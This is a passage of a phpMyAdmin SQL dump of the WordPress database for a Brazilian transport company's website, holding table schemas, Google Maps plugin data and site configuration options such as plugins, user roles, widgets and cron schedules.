-- phpMyAdmin SQL Dump
-- version 4.9.4
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Tempo de geração: 24/05/2020 às 16:59
-- Versão do servidor: 5.6.41-84.1
-- Versão do PHP: 7.3.6

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Banco de dados: `marjo461_araujotrans`
--

-- --------------------------------------------------------

--
-- Estrutura para tabela `wp_commentmeta`
--

CREATE TABLE `wp_commentmeta` (
  `meta_id` bigint(20) UNSIGNED NOT NULL,
  `comment_id` bigint(20) UNSIGNED NOT NULL DEFAULT '0',
  `meta_key` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `meta_value` longtext COLLATE utf8mb4_unicode_ci
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Estrutura para tabela `wp_comments`
--

CREATE TABLE `wp_comments` (
  `comment_ID` bigint(20) UNSIGNED NOT NULL,
  `comment_post_ID` bigint(20) UNSIGNED NOT NULL DEFAULT '0',
  `comment_author` tinytext COLLATE utf8mb4_unicode_ci NOT NULL,
  `comment_author_email` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_author_url` varchar(200) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_author_IP` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `comment_date_gmt` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `comment_content` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `comment_karma` int(11) NOT NULL DEFAULT '0',
  `comment_approved` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '1',
  `comment_agent` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_type` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_parent` bigint(20) UNSIGNED NOT NULL DEFAULT '0',
  `user_id` bigint(20) UNSIGNED NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Estrutura para tabela `wp_create_map`
--

CREATE TABLE `wp_create_map` (
  `map_id` int(11) NOT NULL,
  `map_title` varchar(255) DEFAULT NULL,
  `map_width` varchar(255) DEFAULT NULL,
  `map_height` varchar(255) DEFAULT NULL,
  `map_zoom_level` varchar(255) DEFAULT NULL,
  `map_type` varchar(255) DEFAULT NULL,
  `map_scrolling_wheel` varchar(255) DEFAULT NULL,
  `map_visual_refresh` varchar(255) DEFAULT NULL,
  `map_45imagery` varchar(255) DEFAULT NULL,
  `map_street_view_setting` text,
  `map_route_direction_setting` text,
  `map_all_control` text,
  `map_info_window_setting` text,
  `style_google_map` text,
  `map_locations` text,
  `map_layer_setting` text,
  `map_polygon_setting` text,
  `map_polyline_setting` text,
  `map_cluster_setting` text,
  `map_overlay_setting` text
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Estrutura para tabela `wp_group_map`
--

CREATE TABLE `wp_group_map` (
  `group_map_id` int(11) NOT NULL,
  `group_map_title` varchar(255) DEFAULT NULL,
  `group_marker` text,
  `group_added` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Estrutura para tabela `wp_g_circles`
--

CREATE TABLE `wp_g_circles` (
  `id` int(11) UNSIGNED NOT NULL,
  `map` int(11) NOT NULL,
  `name` varchar(50) NOT NULL,
  `center_lat` varchar(255) NOT NULL,
  `center_lng` varchar(255) NOT NULL,
  `radius` varchar(255) NOT NULL,
  `line_width` varchar(5) NOT NULL,
  `line_opacity` varchar(5) NOT NULL,
  `line_color` varchar(7) NOT NULL,
  `fill_color` varchar(7) NOT NULL,
  `fill_opacity` varchar(7) NOT NULL,
  `hover_line_opacity` varchar(5) NOT NULL,
  `hover_line_color` varchar(7) NOT NULL,
  `hover_fill_color` varchar(7) NOT NULL,
  `hover_fill_opacity` varchar(7) NOT NULL,
  `show_marker` int(7) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Despejando dados para a tabela `wp_g_circles`
--

INSERT INTO `wp_g_circles` (`id`, `map`, `name`, `center_lat`, `center_lng`, `radius`, `line_width`, `line_opacity`, `line_color`, `fill_color`, `fill_opacity`, `hover_line_opacity`, `hover_line_color`, `hover_fill_color`, `hover_fill_opacity`, `show_marker`) VALUES
(1, 1, 'My First Circle', '40.805493843894155', '-76.3165283203125', '50000', '5', '0.8', 'FF2B39', '4FFF72', '0.4', '0.6', 'FF5C5C', '96FFA1', '0.3', 0);

-- --------------------------------------------------------

--
-- Estrutura para tabela `wp_g_maps`
--

CREATE TABLE `wp_g_maps` (
  `id` int(11) UNSIGNED NOT NULL,
  `name` varchar(50) NOT NULL,
  `type` varchar(50) NOT NULL,
  `zoom` int(5) NOT NULL,
  `border_radius` int(5) NOT NULL,
  `center_lat` varchar(255) NOT NULL DEFAULT '0',
  `pan_controller` varchar(5) NOT NULL DEFAULT 'true',
  `zoom_controller` varchar(5) NOT NULL DEFAULT 'true',
  `type_controller` varchar(5) NOT NULL DEFAULT 'true',
  `scale_controller` varchar(5) NOT NULL DEFAULT 'true',
  `street_view_controller` varchar(5) NOT NULL DEFAULT 'true',
  `overview_map_controller` varchar(5) NOT NULL DEFAULT 'true',
  `center_lng` varchar(255) NOT NULL DEFAULT '0',
  `width` varchar(5) NOT NULL DEFAULT '100',
  `height` varchar(5) NOT NULL DEFAULT '300',
  `align` varchar(11) NOT NULL DEFAULT 'left',
  `info_type` varchar(9) NOT NULL DEFAULT 'click'
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Despejando dados para a tabela `wp_g_maps`
--

INSERT INTO `wp_g_maps` (`id`, `name`, `type`, `zoom`, `border_radius`, `center_lat`, `pan_controller`, `zoom_controller`, `type_controller`, `scale_controller`, `street_view_controller`, `overview_map_controller`, `center_lng`, `width`, `height`, `align`, `info_type`) VALUES
(1, 'Sede', 'ROADMAP', 15, 10, '-23.6696206', 'true', 'true', 'true', 'true', 'true', 'false', '-46.7183348', '100', '300', 'center', 'click');

-- --------------------------------------------------------

--
-- Estrutura para tabela `wp_g_markers`
--

CREATE TABLE `wp_g_markers` (
  `id` int(11) UNSIGNED NOT NULL,
  `map` int(11) NOT NULL,
  `title` varchar(50) NOT NULL,
  `lat` varchar(255) NOT NULL DEFAULT '0',
  `lng` varchar(255) NOT NULL DEFAULT '0',
  `animation` varchar(255) NOT NULL DEFAULT 'NONE',
  `description` text NOT NULL,
  `img` varchar(255) NOT NULL,
  `size` varchar(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Despejando dados para a tabela `wp_g_markers`
--

INSERT INTO `wp_g_markers` (`id`, `map`, `title`, `lat`, `lng`, `animation`, `description`, `img`, `size`) VALUES
(3, 1, 'Araujo Transportes', '-23.6722196', '-46.71592079999999', 'BOUNCE', '', '../wp-content/plugins/google-map-wp/images/icons/redmarker256.png', '256');

-- --------------------------------------------------------

--
-- Estrutura para tabela `wp_g_polygones`
--

CREATE TABLE `wp_g_polygones` (
  `id` int(11) UNSIGNED NOT NULL,
  `map` int(11) NOT NULL,
  `name` varchar(50) NOT NULL,
  `data` text NOT NULL,
  `line_opacity` varchar(5) NOT NULL,
  `line_color` varchar(9) NOT NULL,
  `fill_opacity` varchar(5) NOT NULL,
  `fill_color` varchar(9) NOT NULL,
  `url` text NOT NULL,
  `hover_line_opacity` varchar(5) NOT NULL,
  `hover_line_color` varchar(9) NOT NULL,
  `hover_fill_opacity` varchar(5) NOT NULL,
  `hover_fill_color` varchar(9) NOT NULL,
  `line_width` varchar(9) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Estrutura para tabela `wp_g_polylines`
--

CREATE TABLE `wp_g_polylines` (
  `id` int(11) UNSIGNED NOT NULL,
  `map` int(11) NOT NULL,
  `name` varchar(50) NOT NULL,
  `data` text NOT NULL,
  `line_opacity` varchar(5) NOT NULL,
  `line_color` varchar(7) NOT NULL,
  `line_width` varchar(5) NOT NULL,
  `hover_line_color` varchar(9) NOT NULL,
  `hover_line_opacity` varchar(9) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Despejando dados para a tabela `wp_g_polylines`
--

INSERT INTO `wp_g_polylines` (`id`, `map`, `name`, `data`, `line_opacity`, `line_color`, `line_width`, `hover_line_color`, `hover_line_opacity`) VALUES
(1, 1, 'My First Polyline', '(42.24071874922666, -71.81488037109375),(42.1532233123986, -71.95770263671875),(42.13082130188811, -72.06207275390625),(42.14507804381756, -72.125244140625),(42.18579390537848, -72.2186279296875),(42.16340342422401, -72.2845458984375),(42.1837587346522, -72.3175048828125),(42.1552594657786, -72.36968994140625),(42.169510705216595, -72.4822998046875),(42.157295553651636, -72.630615234375),(42.13896840458089, -72.72674560546875),(42.165439250064324, -72.850341796875),(42.173581898327754, -72.92312622070312),(42.2366518803206, -73.00277709960938),(42.24478535602799, -73.10714721679688),(42.30169032824452, -73.17306518554688),(42.3016903282445, -73.34884643554688),(42.37883631647602, -73.45596313476562),(42.41940144722477, -73.54385375976562),(42.47209690919285, -73.63174438476562),(42.482225570025925, -73.67294311523438),(42.50652766705062, -73.78005981445312),(42.34027515373573, -73.85421752929688),(42.173581898327754, -73.93112182617188),(41.9921602333763, -73.99703979492188),(41.91249742196845, -74.04098510742188),(41.83682786072714, -74.17831420898438),(41.79179268262892, -74.23599243164062),(41.75492216766298, -74.36782836914062),(41.70777900286713, -74.38430786132812),(41.582579601430346, -74.48318481445312),(41.36238012945534, -74.70291137695312)', '0.9', '18A326', '4', '11A000', '0.5');

-- --------------------------------------------------------

--
-- Estrutura para tabela `wp_links`
--

CREATE TABLE `wp_links` (
  `link_id` bigint(20) UNSIGNED NOT NULL,
  `link_url` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_image` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_target` varchar(25) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_description` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_visible` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'Y',
  `link_owner` bigint(20) UNSIGNED NOT NULL DEFAULT '1',
  `link_rating` int(11) NOT NULL DEFAULT '0',
  `link_updated` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `link_rel` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `link_notes` mediumtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `link_rss` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT ''
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Estrutura para tabela `wp_map_locations`
--

CREATE TABLE `wp_map_locations` (
  `location_id` int(11) NOT NULL,
  `location_title` varchar(255) DEFAULT NULL,
  `location_address` varchar(255) DEFAULT NULL,
  `location_draggable` varchar(255) DEFAULT NULL,
  `location_latitude` varchar(255) DEFAULT NULL,
  `location_longitude` varchar(255) DEFAULT NULL,
  `location_messages` text,
  `location_marker_image` text,
  `location_group_map` int(11) DEFAULT NULL,
  `location_added` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

--
-- Despejando dados para a tabela `wp_map_locations`
--

INSERT INTO `wp_map_locations` (`location_id`, `location_title`, `location_address`, `location_draggable`, `location_latitude`, `location_longitude`, `location_messages`, `location_marker_image`, `location_group_map`, `location_added`) VALUES
(1, 'Sede', 'Av. de Pinedo, 837, Socorro, State of São Paulo, Brazil', 'false', '-23.6722196', '-46.71592079999999', 'YToxOntzOjMyOiJnb29nbGVtYXBfaW5mb3dpbmRvd19tZXNzYWdlX29uZSI7czowOiIiO30=', '', 0, '2015-03-20 04:15:31');

-- --------------------------------------------------------

--
-- Estrutura para tabela `wp_options`
--

CREATE TABLE `wp_options` (
  `option_id` bigint(20) UNSIGNED NOT NULL,
  `option_name` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `option_value` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `autoload` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'yes'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Despejando dados para a tabela `wp_options`
--

INSERT INTO `wp_options` (`option_id`, `option_name`, `option_value`, `autoload`) VALUES
(1, 'siteurl', 'http://www.araujotrans.com.br', 'yes'),
(2, 'home', 'http://www.araujotrans.com.br', 'yes'),
(3, 'blogname', 'Araújo Transportes', 'yes'),
(4, 'blogdescription', 'Sempre com você!', 'yes'),
(5, 'users_can_register', '0', 'yes'),
(6, 'admin_email', 'marjori@ywc.com.br', 'yes'),
(7, 'start_of_week', '0', 'yes'),
(8, 'use_balanceTags', '0', 'yes'),
(9, 'use_smilies', '1', 'yes'),
(10, 'require_name_email', '1', 'yes'),
(11, 'comments_notify', '1', 'yes'),
(12, 'posts_per_rss', '10', 'yes'),
(13, 'rss_use_excerpt', '0', 'yes'),
(14, 'mailserver_url', 'mail.example.com', 'yes'),
(15, 'mailserver_login', 'login@example.com', 'yes'),
(16, 'mailserver_pass', 'password', 'yes'),
(17, 'mailserver_port', '110', 'yes'),
(18, 'default_category', '1', 'yes'),
(19, 'default_comment_status', 'open', 'yes'),
(20, 'default_ping_status', 'open', 'yes'),
(21, 'default_pingback_flag', '1', 'yes'),
(22, 'posts_per_page', '10', 'yes'),
(23, 'date_format', 'j \\d\\e F \\d\\e Y', 'yes'),
(24, 'time_format', 'H:i', 'yes'),
(25, 'links_updated_date_format', 'j \\d\\e F \\d\\e Y, H:i', 'yes'),
(26, 'comment_moderation', '0', 'yes'),
(27, 'moderation_notify', '1', 'yes'),
(28, 'permalink_structure', '/%postname%/', 'yes'),
(30, 'hack_file', '0', 'yes'),
(31, 'blog_charset', 'UTF-8', 'yes'),
(32, 'moderation_keys', '', 'no'),
(33, 'active_plugins', 'a:4:{i:0;s:21:\"facebook/facebook.php\";i:1;s:27:\"google-map-wp/googlemap.php\";i:2;s:35:\"si-contact-form/si-contact-form.php\";i:3;s:41:\"wp-database-backup/wp-database-backup.php\";}', 'yes'),
(34, 'category_base', '', 'yes'),
(35, 'ping_sites', 'http://rpc.pingomatic.com/', 'yes'),
(37, 'comment_max_links', '2', 'yes'),
(38, 'gmt_offset', '', 'yes'),
(39, 'default_email_category', '1', 'yes'),
(40, 'recently_edited', 'a:5:{i:0;s:73:\"/home/ywccom/public_html/araujotrans/wp-content/themes/spacious/style.css\";i:2;s:77:\"/home/ywccom/public_html/araujotrans/wp-content/plugins/facebook/facebook.php\";i:3;s:73:\"/home/comywc/public_html/araujotrans/wp-content/themes/spacious/style.css\";i:4;s:91:\"/home/comywc/public_html/araujotrans/wp-content/plugins/si-contact-form/si-contact-form.php\";i:5;s:101:\"/home/comywc/public_html/araujotrans/wp-content/plugins/wp-google-map-plugin/wp-google-map-plugin.php\";}', 'no'),
(41, 'template', 'spacious', 'yes'),
(42, 'stylesheet', 'spacious', 'yes'),
(43, 'comment_whitelist', '1', 'yes'),
(44, 'blacklist_keys', '', 'no'),
(45, 'comment_registration', '0', 'yes'),
(46, 'html_type', 'text/html', 'yes'),
(47, 'use_trackback', '0', 'yes'),
(48, 'default_role', 'subscriber', 'yes'),
(49, 'db_version', '38590', 'yes'),
(50, 'uploads_use_yearmonth_folders', '1', 'yes'),
(51, 'upload_path', '', 'yes'),
(52, 'blog_public', '1', 'yes'),
(53, 'default_link_category', '2', 'yes'),
(54, 'show_on_front', 'page', 'yes'),
(55, 'tag_base', '', 'yes'),
(56, 'show_avatars', '1', 'yes'),
(57, 'avatar_rating', 'G', 'yes'),
(58, 'upload_url_path', '', 'yes'),
(59, 'thumbnail_size_w', '150', 'yes'),
(60, 'thumbnail_size_h', '150', 'yes'),
(61, 'thumbnail_crop', '1', 'yes'),
(62, 'medium_size_w', '300', 'yes'),
(63, 'medium_size_h', '300', 'yes'),
(64, 'avatar_default', 'mystery', 'yes'),
(65, 'large_size_w', '1024', 'yes'),
(66, 'large_size_h', '1024', 'yes'),
(67, 'image_default_link_type', 'file', 'yes'),
(68, 'image_default_size', '', 'yes'),
(69, 'image_default_align', '', 'yes'),
(70, 'close_comments_for_old_posts', '0', 'yes'),
(71, 'close_comments_days_old', '14', 'yes'),
(72, 'thread_comments', '1', 'yes'),
(73, 'thread_comments_depth', '5', 'yes'),
(74, 'page_comments', '0', 'yes'),
(75, 'comments_per_page', '50', 'yes'),
(76, 'default_comments_page', 'newest', 'yes'),
(77, 'comment_order', 'asc', 'yes'),
(78, 'sticky_posts', 'a:0:{}', 'yes'),
(79, 'widget_categories', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(80, 'widget_text', 'a:6:{i:2;a:3:{s:5:\"title\";s:9:\"Siga-nos!\";s:4:\"text\";s:0:\"\";s:6:\"filter\";b:0;}i:3;a:3:{s:5:\"title\";s:0:\"\";s:4:\"text\";s:171:\"<a href=\"https://www.facebook.com/pages/Araujo-transportes/234774583371464\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/face.png\" /></a>\";s:6:\"filter\";b:0;}i:4;a:3:{s:5:\"title\";s:0:\"\";s:4:\"text\";s:150:\"<a href=\"https://twitter.com/araujo_trans\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/Twitter_Shipping.png\" /></a>\";s:6:\"filter\";b:0;}i:5;a:3:{s:5:\"title\";s:0:\"\";s:4:\"text\";s:164:\"<a href=\"https://plus.google.com/104014033202692965911/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/google-_Shipping.png\" /></a>\";s:6:\"filter\";b:0;}i:6;a:3:{s:5:\"title\";s:0:\"\";s:4:\"text\";s:813:\"<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/logo-lateral.jpg\" />\r\n\r\n<img class=\"indicadores\" src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/mapa.png\" /> Rua Amaro Leite, 374\r\n04763-060 – Socorro, São Paulo/SP\r\n<div class=\"clear\"></div>\r\n<img class=\"indicadores\" src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/tele.png\" /> (11) 25971454 / (11) 25971463\r\n<div class=\"clear\"></div>\r\n<img class=\"indicadores\" src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/email.png\" /> <a href=\"mailto:contato@araujotrans.com.br\">contato@araujotrans.com.br</a>\r\n<div class=\"clear\"></div>\r\n<img class=\"indicadores\" src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/site.png\" /><a href=\"http://www.araujotrans.com.br/\">www.araujotrans.com.br</a>\r\n<div class=\"clear\"></div>\";s:6:\"filter\";b:1;}s:12:\"_multiwidget\";i:1;}', 'yes'),
(81, 'widget_rss', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(82, 'uninstall_plugins', 'a:0:{}', 'no'),
(83, 'timezone_string', 'America/Sao_Paulo', 'yes'),
(84, 'page_for_posts', '0', 'yes'),
(85, 'page_on_front', '46', 'yes'),
(86, 'default_post_format', '0', 'yes'),
(87, 'link_manager_enabled', '0', 'yes'),
(88, 'initial_db_version', '29630', 'yes'),
(89, 'wp_user_roles', 'a:5:{s:13:\"administrator\";a:2:{s:4:\"name\";s:13:\"Administrator\";s:12:\"capabilities\";a:66:{s:13:\"switch_themes\";b:1;s:11:\"edit_themes\";b:1;s:16:\"activate_plugins\";b:1;s:12:\"edit_plugins\";b:1;s:10:\"edit_users\";b:1;s:10:\"edit_files\";b:1;s:14:\"manage_options\";b:1;s:17:\"moderate_comments\";b:1;s:17:\"manage_categories\";b:1;s:12:\"manage_links\";b:1;s:12:\"upload_files\";b:1;s:6:\"import\";b:1;s:15:\"unfiltered_html\";b:1;s:10:\"edit_posts\";b:1;s:17:\"edit_others_posts\";b:1;s:20:\"edit_published_posts\";b:1;s:13:\"publish_posts\";b:1;s:10:\"edit_pages\";b:1;s:4:\"read\";b:1;s:8:\"level_10\";b:1;s:7:\"level_9\";b:1;s:7:\"level_8\";b:1;s:7:\"level_7\";b:1;s:7:\"level_6\";b:1;s:7:\"level_5\";b:1;s:7:\"level_4\";b:1;s:7:\"level_3\";b:1;s:7:\"level_2\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:17:\"edit_others_pages\";b:1;s:20:\"edit_published_pages\";b:1;s:13:\"publish_pages\";b:1;s:12:\"delete_pages\";b:1;s:19:\"delete_others_pages\";b:1;s:22:\"delete_published_pages\";b:1;s:12:\"delete_posts\";b:1;s:19:\"delete_others_posts\";b:1;s:22:\"delete_published_posts\";b:1;s:20:\"delete_private_posts\";b:1;s:18:\"edit_private_posts\";b:1;s:18:\"read_private_posts\";b:1;s:20:\"delete_private_pages\";b:1;s:18:\"edit_private_pages\";b:1;s:18:\"read_private_pages\";b:1;s:12:\"delete_users\";b:1;s:12:\"create_users\";b:1;s:17:\"unfiltered_upload\";b:1;s:14:\"edit_dashboard\";b:1;s:14:\"update_plugins\";b:1;s:14:\"delete_plugins\";b:1;s:15:\"install_plugins\";b:1;s:13:\"update_themes\";b:1;s:14:\"install_themes\";b:1;s:11:\"update_core\";b:1;s:10:\"list_users\";b:1;s:12:\"remove_users\";b:1;s:13:\"promote_users\";b:1;s:18:\"edit_theme_options\";b:1;s:13:\"delete_themes\";b:1;s:6:\"export\";b:1;s:17:\"wpt_twitter_oauth\";b:1;s:18:\"wpt_twitter_custom\";b:1;s:18:\"wpt_twitter_switch\";b:1;s:13:\"wpt_can_tweet\";b:1;s:13:\"wpt_tweet_now\";b:1;}}s:6:\"editor\";a:2:{s:4:\"name\";s:6:\"Editor\";s:12:\"capabilities\";a:35:{s:17:\"moderate_comments\";b:1;s:17:\"manage_categories\";b:1;s:12:\"manage_links\";b:1;s:12:\"upload_files\";b:1;s:15:\"unfiltered_html\";b:1;s:10:\"edit_posts\";b:1;s:17:\"edit_others_posts\";b:1;s:20:\"edit_published_posts\";b:1;s:13:\"publish_posts\";b:1;s:10:\"edit_pages\";b:1;s:4:\"read\";b:1;s:7:\"level_7\";b:1;s:7:\"level_6\";b:1;s:7:\"level_5\";b:1;s:7:\"level_4\";b:1;s:7:\"level_3\";b:1;s:7:\"level_2\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:17:\"edit_others_pages\";b:1;s:20:\"edit_published_pages\";b:1;s:13:\"publish_pages\";b:1;s:12:\"delete_pages\";b:1;s:19:\"delete_others_pages\";b:1;s:22:\"delete_published_pages\";b:1;s:12:\"delete_posts\";b:1;s:19:\"delete_others_posts\";b:1;s:22:\"delete_published_posts\";b:1;s:20:\"delete_private_posts\";b:1;s:18:\"edit_private_posts\";b:1;s:18:\"read_private_posts\";b:1;s:20:\"delete_private_pages\";b:1;s:18:\"edit_private_pages\";b:1;s:18:\"read_private_pages\";b:1;s:13:\"wpt_can_tweet\";b:1;}}s:6:\"author\";a:2:{s:4:\"name\";s:6:\"Author\";s:12:\"capabilities\";a:11:{s:12:\"upload_files\";b:1;s:10:\"edit_posts\";b:1;s:20:\"edit_published_posts\";b:1;s:13:\"publish_posts\";b:1;s:4:\"read\";b:1;s:7:\"level_2\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:12:\"delete_posts\";b:1;s:22:\"delete_published_posts\";b:1;s:13:\"wpt_can_tweet\";b:1;}}s:11:\"contributor\";a:2:{s:4:\"name\";s:11:\"Contributor\";s:12:\"capabilities\";a:6:{s:10:\"edit_posts\";b:1;s:4:\"read\";b:1;s:7:\"level_1\";b:1;s:7:\"level_0\";b:1;s:12:\"delete_posts\";b:1;s:13:\"wpt_can_tweet\";b:1;}}s:10:\"subscriber\";a:2:{s:4:\"name\";s:10:\"Subscriber\";s:12:\"capabilities\";a:2:{s:4:\"read\";b:1;s:7:\"level_0\";b:1;}}}', 'yes'),
(90, 'WPLANG', 'pt_BR', 'yes'),
(91, 'widget_search', 'a:3:{i:4;a:1:{s:5:\"title\";s:0:\"\";}i:5;a:1:{s:5:\"title\";s:0:\"\";}s:12:\"_multiwidget\";i:1;}', 'yes'),
(92, 'widget_recent-posts', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(93, 'widget_recent-comments', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(94, 'widget_archives', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(95, 'widget_meta', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(96, 'sidebars_widgets', 'a:15:{s:19:\"wp_inactive_widgets\";a:0:{}s:22:\"spacious_right_sidebar\";a:2:{i:0;s:6:\"text-6\";i:1;s:8:\"search-5\";}s:21:\"spacious_left_sidebar\";a:0:{}s:23:\"spacious_header_sidebar\";a:1:{i:0;s:8:\"search-4\";}s:42:\"spacious_business_page_top_section_sidebar\";a:1:{i:0;s:25:\"spacious_service_widget-2\";}s:55:\"spacious_business_page_middle_section_left_half_sidebar\";a:0:{}s:56:\"spacious_business_page_middle_section_right_half_sidebar\";a:0:{}s:45:\"spacious_business_page_bottom_section_sidebar\";a:0:{}s:29:\"spacious_contact_page_sidebar\";a:0:{}s:31:\"spacious_error_404_page_sidebar\";a:0:{}s:27:\"spacious_footer_sidebar_one\";a:1:{i:0;s:6:\"text-2\";}s:27:\"spacious_footer_sidebar_two\";a:1:{i:0;s:6:\"text-3\";}s:29:\"spacious_footer_sidebar_three\";a:1:{i:0;s:6:\"text-4\";}s:28:\"spacious_footer_sidebar_four\";a:1:{i:0;s:6:\"text-5\";}s:13:\"array_version\";i:3;}', 'yes'),
(97, 'cron', 'a:6:{i:1590351510;a:3:{s:16:\"wp_version_check\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:10:\"twicedaily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:43200;}}s:17:\"wp_update_plugins\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:10:\"twicedaily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:43200;}}s:16:\"wp_update_themes\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:10:\"twicedaily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:43200;}}}i:1590351519;a:1:{s:19:\"wp_scheduled_delete\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:5:\"daily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:86400;}}}i:1590352369;a:1:{s:34:\"wp_privacy_delete_old_export_files\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:6:\"hourly\";s:4:\"args\";a:0:{}s:8:\"interval\";i:3600;}}}i:1590368049;a:1:{s:25:\"delete_expired_transients\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:5:\"daily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:86400;}}}i:1590420877;a:1:{s:30:\"wp_scheduled_auto_draft_delete\";a:1:{s:32:\"40cd750bba9870f18aada2478b24840a\";a:3:{s:8:\"schedule\";s:5:\"daily\";s:4:\"args\";a:0:{}s:8:\"interval\";i:86400;}}}s:7:\"version\";i:2;}', 'yes'),
(100, '_transient_random_seed', 'e09e5d52f337183a26c29e2c80f08970', 'yes'),
(131, 'auto_core_update_notified', 'a:4:{s:4:\"type\";s:7:\"success\";s:5:\"email\";s:18:\"marjori@ywc.com.br\";s:7:\"version\";s:6:\"4.9.14\";s:9:\"timestamp\";i:1588196778;}', 'no'),
(133, 'recently_activated', 'a:0:{}', 'yes'),
(135, 'db_upgraded', '', 'yes'),
(148, '_transient_twentyfourteen_category_count', '1', 'yes'),
(157, 'theme_mods_twentyfourteen', 'a:1:{s:16:\"sidebars_widgets\";a:2:{s:4:\"time\";i:1425706252;s:4:\"data\";a:4:{s:19:\"wp_inactive_widgets\";a:0:{}s:9:\"sidebar-1\";a:6:{i:0;s:8:\"search-2\";i:1;s:14:\"recent-posts-2\";i:2;s:17:\"recent-comments-2\";i:3;s:10:\"archives-2\";i:4;s:12:\"categories-2\";i:5;s:6:\"meta-2\";}s:9:\"sidebar-2\";a:0:{}s:9:\"sidebar-3\";a:0:{}}}}', 'yes'),
(158, 'current_theme', 'Spacious', 'yes'),
